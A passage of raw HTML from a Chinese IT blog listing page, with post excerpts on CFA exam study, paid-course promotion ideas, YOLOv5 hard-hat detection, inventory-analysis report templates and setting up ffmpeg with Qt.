道德放在最后看是明智的，战略性放弃是不明智的，任何一科你都可以花费最少的时间达到40分，这些都是低分飘过必须的，你不能放弃任何一分，所以，即使是另类，你也没资格放弃。对于其它科，对于一个理科生，固定收益，数量，股票，衍生品，组合是完全且必须得a的，只要理解，只要再看得懂题，可以达到。财务很难，至少对于我这个翻开书前一点不懂的人，至少花了150小时里的70小时，但仍旧是b，但这科太重要，放弃它，你就别去考了。道德很灵活，理解也非常重要，听一遍老师的理解吧，记住一些典型的例子吧。经济更难，但考的简单。其它科，按自己的情况复习吧。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1ff142d6900ac3617c488c42840aa986/" rel="bookmark">
			知识付费平台的线上推广方案总结，赶紧收藏了！
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 知识付费平台的线上推广方案总结，赶紧收藏了！ 限时免费试听/试读：让用户在一定时间内免费体验部分课程或内容。推广联盟：与其他平台合作，共享用户资源。优惠券发放：定期发放优惠券，鼓励用户购买。知识问答比赛：举办在线知识问答比赛，吸引用户参与。互动课程：提供具有互动性的课程，提高用户参与度。学习打卡活动：鼓励用户每日打卡学习，培养学习习惯。社群营销：建立学习社群，增加用户黏性。在线讲座：邀请专家进行在线讲座，吸引用户关注。积分兑换：用户学习可获得积分，积分可兑换课程或礼品。学习工具集成：集成学习工具，提供一站式学习体验。课程推荐系统：根据用户学习行为推荐相关课程。会员制度：设立会员制度，提供会员专属权益。社交媒体活动：在社交媒体上发起话题或挑战活动。合作伙伴推广：与相关品牌或机构合作推广。在线直播互动：提供在线直播功能，增强互动性。短视频推广：利用短视频平台进行推广。用户评价分享：鼓励用户分享学习心得和评价。线下活动线上化：将线下活动转移到线上，扩大影响力。虚拟社区建设：建立虚拟社区，方便用户交流互动。移动端优化：优化移动端界面和体验，提高用户留存率。个性化推荐：根据用户兴趣和需求推荐课程。课程打包销售：将相关课程打包销售，提供优惠价格。口碑营销：鼓励用户通过口碑传播推荐给他人。免费公开课：定期开设免费公开课，吸引潜在用户。问答社区建设：建立问答社区，解决用户问题。教育论坛合作：与教育论坛合作，扩大知名度。互动游戏化学习：将学习内容以游戏的形式呈现，增加趣味性。学习工具开发：开发专属的学习工具或应用。在线作业与考试系统：提供在线作业与考试功能，方便用户自我检测。电子书发布：发布相关领域的电子书，丰富学习资源。合作宣传：与教育机构、企业等合作进行宣传和互推。问答互动活动：定期举办在线问答互动活动，增强用户参与感。定制课程服务：为用户定制专属课程或培训项目。话题挑战活动：在社交媒体上发起话题挑战活动，鼓励用户参与讨论和分享。在线研讨会：举办在线研讨会或论坛，邀请专家学者发表演讲或分享经验。视频教程制作：制作精美的视频教程，展示平台特点和优势。知识竞赛活动：举办在线知识竞赛活动，吸引用户参与并赢取奖励。课程评价与反馈系统：建立完善的课程评价与反馈系统，及时收集用户意见和建议，不断优化课程内容和服务质量。跨平台推广：在其他知名平台或应用上投放广告或进行合作推广，扩大知名度。名人代言合作：邀请知名人士或专家代言合作，提高品牌形象和可信度。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/33a69abf346fa0afb81ae11ec8a6a28c/" rel="bookmark">
			互联网加竞赛 Yolov安全帽佩戴检测 危险区域进入检测 - 深度学习 opencv
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1 前言 🔥 优质竞赛项目系列，今天要分享的是
🚩 Yolov安全帽佩戴检测 危险区域进入检测
🥇学长这里给一个题目综合评分(每项满分5分)
难度系数：3分工作量：3分创新点：4分 该项目较为新颖，适合作为竞赛课题方向，学长非常推荐！
🧿 更多资料, 项目分享：
https://gitee.com/dancheng-senior/postgraduate
1 课题背景 建筑工人头部伤害是造成建筑伤亡事故的重要原因。佩戴安全帽是防止建筑工人发生脑部外伤事故的有效措施,而在实际工作中工人未佩戴安全帽的不安全行为时有发生。因此,对施工现场建筑工人佩戴安全帽自动实时检测进行探究,将为深入认知和主动预防安全事故提供新的视角。然而,传统的施工现场具有安全管理水平低下、管理范围小、主要依靠安全管理人员的主观监测并且时效性差、不能全程监控等一系列问题。
本项目基于yolov5实现了安全帽和危险区域检测。
2 效果演示 3 Yolov5框架 我们选择当下YOLO最新的卷积神经网络YOLOv5来进行火焰识别检测。6月9日，Ultralytics公司开源了YOLOv5，离上一次YOLOv4发布不到50天。而且这一次的YOLOv5是完全基于PyTorch实现的！在我们还对YOLOv4的各种高端操作、丰富的实验对比惊叹不已时，YOLOv5又带来了更强实时目标检测技术。按照官方给出的数目，现版本的YOLOv5每个图像的推理时间最快0.007秒，即每秒140帧（FPS），但YOLOv5的权重文件大小只有YOLOv4的1/9。
目标检测架构分为两种，一种是two-stage，一种是one-stage，区别就在于 two-stage 有region
proposal过程，类似于一种海选过程,网络会根据候选区域生成位置和类别，而one-stage直接从图片生成位置和类别。今天提到的 YOLO就是一种
one-stage方法。YOLO是You Only Look Once的缩写,意思是神经网络只需要看一次图片，就能输出结果。YOLO
一共发布了五个版本，其中 YOLOv1 奠定了整个系列的基础，后面的系列就是在第一版基础上的改进，为的是提升性能。
YOLOv5有4个版本性能如图所示：
网络架构图
YOLOv5是一种单阶段目标检测算法，该算法在YOLOv4的基础上添加了一些新的改进思路，使其速度与精度都得到了极大的性能提升。主要的改进思路如下所示：
输入端
在模型训练阶段，提出了一些改进思路，主要包括Mosaic数据增强、自适应锚框计算、自适应图片缩放；
Mosaic数据增强
：Mosaic数据增强的作者也是来自YOLOv5团队的成员，通过随机缩放、随机裁剪、随机排布的方式进行拼接，对小目标的检测效果很不错
基准网络
融合其它检测算法中的一些新思路，主要包括：Focus结构与CSP结构；
Neck网络
在目标检测领域，为了更好的提取融合特征，通常在Backbone和输出层，会插入一些层，这个部分称为Neck。Yolov5中添加了FPN+PAN结构，相当于目标检测网络的颈部，也是非常关键的。
FPN+PAN的结构
这样结合操作，FPN层自顶向下传达强语义特征（High-Level特征），而特征金字塔则自底向上传达强定位特征（Low-
Level特征)，两两联手，从不同的主干层对不同的检测层进行特征聚合。
FPN+PAN借鉴的是18年CVPR的PANet，当时主要应用于图像分割领域，但Alexey将其拆分应用到Yolov4中，进一步提高特征提取的能力。
Head输出层
输出层的锚框机制与YOLOv4相同，主要改进的是训练时的损失函数GIOU_Loss，以及预测框筛选的DIOU_nms。
对于Head部分，可以看到三个紫色箭头处的特征图是40×40、20×20、10×10。以及最后Prediction中用于预测的3个特征图：
​
①==&gt;40×40×255 ②==&gt;20×20×255 ③==&gt;10×10×255 ​ 相关代码
class Detect(nn.Module): stride = None # strides computed during build onnx_dynamic = False # ONNX export parameter def __init__(self, nc=80, anchors=(), ch=(), inplace=True): # detection layer super().
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/33a69abf346fa0afb81ae11ec8a6a28c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8e2ad0fd0310e7bfbb4f0b4cb8e5c74e/" rel="bookmark">
			库存管理怎么做？6大分析模板和库存管理软件一起分享给你！
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		库存管理是指对一个组织或企业的物品、原材料、成品或商品等存货进行有效管理和控制的过程。其目标是确保所需物品的供应，同时最小化库存成本，包括存储成本、资金占用成本和风险成本。
但在老李了解过的制造业企业中，有不少企业曾由于没有合理地对供应链管理环节中的采购及销售库存进行管理，结果辛辛苦苦一年下来，所赚的“利润”静静地躺在仓库，变成“呆滞库存”，甚至“高额仓储成本开销”。
有效的库存管理可以帮助企业提高运营效率、降低库存成本、提供更好的客户服务，并减少因过多或过少库存而带来的问题。但如何在确保生产及销售需求，且按质、按量、按期交付的前提下，以最低的成本合理地管理库存呢？这是困扰很多管理者的一个难题。
为此，老李特意为大家准备了六款库存分析报告，赶快收藏起来！
库存管理怎么做？ 01 库存变动分析报告 此报告可帮助查看者明确当前库存变动的数据。
包括：监控收入增长率、存货占收入比例分析存货行为的正确性、存货与收入的增长趋势评估存货合理性、明确企业自身的周期性行为月度存货变动明细表等。库存变动分析报告旨在留意存货关键指标值及其变化趋势，洞悉库存变动情况。
根据存货与收入的增长趋势评估存货合理性；
监控收入增长率、存货占收入比例分析存货行为的正确性；
追踪月度存货周转天数并在纵向上与去年趋势相比较，明确企业自身的周期性行为；
展示月度存货变动明细表，包含存货数量、主营业务收入、主营业务成本、收入增长率等重要信息；
根据存货累积量并与同期对比来辅助判断当期存货行为的正确性；
追踪月度主营业务收入与成本、主营业务与存货对比数据，分析当前存货行为带来的利润增长。
02 库存结构分析报告 库存结构分析报告结合二八原则，对库存物料做分类分析。包括：高周转率、低周转率产品占比、库存物料级别比例和物料金额分布、判断当期存货行为的正确性等。库存结构分析报告旨在留意不同库存结构物料变化趋势，洞悉物料变动情况。
价值昂贵的A类物料——重点管控普通价值的B类物料——适当放松低价值的C类产品——保证供给。 该报告主要功能：
展示高周转率、低周转率产品占比；
根据物料ABC等级划分把控当前库存物料级别比例和物料金额分布；
在纵向上对当期和同期的库存数量、销售额进行对比，判断当期存货行为的正确性；
在横向上对比不同产品库存周转天数、库存金额和库存周转率，把控单个产品库存情况，有的放矢；
聚焦不同等级物料的累计销售额与累计陈列量之间的二元关系，找出每个等级物料的共通点。
03 呆滞品分析报告 呆滞品分析表帮助采购人员在采购计划执行前核对是否为呆滞库存，以采取恰当的处理方式。包括：月度滞销品数量和含税金额的分析、消费滞销品含税金额趋势分析和造成呆滞品含税金额趋势分析。
将呆滞物料分为消化呆滞品和造成呆滞品，监控每类呆滞品的数量、构成和具体二级分类下的月度含税金额变化趋势，实时透明给库管、生产、采购等责任部门，传导给对应责任人，督促其制定相关消除措施并执行。
下图是月度滞销品数量和含税金额的分析；
下图是消费滞销品构成比例和消费滞销品含税金额趋势分析；
下图是造成呆滞品的构成比例和造成呆滞品含税金额趋势分析；
04 库存周转率分析报告 该报告首先展示高周转率、低周转率产品占比，以及周转天数的细分层级：
周转天数&lt;20天——库存不足20天&lt;周转天数&lt;45天——库存正常45天&lt;周转天数&lt;60天——库存积压周转天数&gt;60天——库存严重积压 另外将把控不同产品的库存周转率和库存金额之间的二元关系，并对库存金额高于200元的产品进行预警。高层管理者及运营人员可根据物料的库存周转率和库存金额，制订物料是否需要加大投入、是否需要根据投资收益风险及时调整等应对策略。
下图是高库存周转率产品占比；
下图是库存金额分析；
下图是低库存周转率占比；
下图是库存周转率分析；
05 库存预警分析报告 库存预警分析报告旨在帮助高层管理者、库管及采购人员能够及时获取到库存遵循不同的周转天数规则时出现不足、正常、积压、严重积压状态的预警信息，并且可以根据滞销品预警、缺货预警等多种状态预警，及时决策，避免库存积压、物料呆滞、产品脱销、客户流失等现象的出现。
包括：高周转率与低周转率产品占比、对物料库存达成低于60%的基地予以警示、各货位物料分布等。
该报告主要功能：
综合展示了高周转率与低周转率产品占比、周转天数的细分层级、ABC级物料平均金额，以及关乎原料、下单量、订单下达量的重点指标；
统计各基地半成品库存与计划库存数量，对物料库存达成低于60%的基地予以警示；
同时把控各货位物料分布，方便根据承载量对各货位内的存货进行横向调整；
聚焦应收问题客户、缺货产品型号和滞销单品，实时展示三类预警信息；
细化重点产品线低价位段销量情况，方便后期管理人员对不同产品的价格、库存等进行调整；
分析销售周期天数和超期天数构成，最后展示长尾门店销售明细。
06 库龄分析报告 库龄分析报告旨在把控不同产品型号的库存占比，并展示月度物料入库趋势，高层管理者可以根据报告指标监控企业整体库存状态，保证库存总体稳定，动态平衡。
包括：展示今日入库、今日出库物料数、针对不同物料和产品制定不同的库存区间和不同产品的库龄进行汇总。
该报告主要功能：
展示今日入库、今日出库物料数；
其次按照库存库龄分布的规则，针对不同物料和产品制定不同的库存区间；
并对不同产品的库龄进行汇总，针对库存时间长、物料占比较大的异常库存，在报告页面突出显示。
库存管理模板和工具 后台回复关键词【库存管理】获取
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6df840b3a4d625c2ba534fab55497899/" rel="bookmark">
			ffmpeg之QT开发环境搭建
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		ffmpeg+QT开发环境搭建 1、新建 QT 工程 2、拷贝所需的 lib 文件和头文件 将之前编译的 lib 文件以及整个 include 目录下的文件拷贝到 QT 项目目录下
如下图所示：
2、拷贝所需的 dll 动态库文件 然后将之前编译的 bin 文件加的所有 .dll 动态库复制到 qt 编译后的 debug文件夹下。
如下图所示：
3、修改 QT 项目的主配置文件 （.pro 文件） 修改 QT 项目的主配置文件 （.pro 文件），指定头文件及 lib 库文件路径，新增下面内容：
INCLUDEPATH += $$PWD/include LIBS += $$PWD/lib/avcodec.lib \ $$PWD/lib/avdevice.lib \ $$PWD/lib/avfilter.lib \ $$PWD/lib/avformat.lib \ $$PWD/lib/avutil.lib \ $$PWD/lib/swresample.lib \ $$PWD/lib/swscale.lib 4、验证测试 以打印 av_version_info 的版本作为测试方法，将下面的程序复制到 main.cpp 中
```c #include "mainwindow.h" #include &lt;QApplication&gt; #include &lt;QDebug&gt; // 利用打印函数 // ffmpeg 是纯 C 语言的代码，在 C++ 当中不能直接进行 include extern "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6df840b3a4d625c2ba534fab55497899/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/24/">«</a>
	<span class="pagination__item pagination__item--current">25/279</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/26/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 IT学习者博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<script src="https://itnewbiea.github.io/js/foot.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>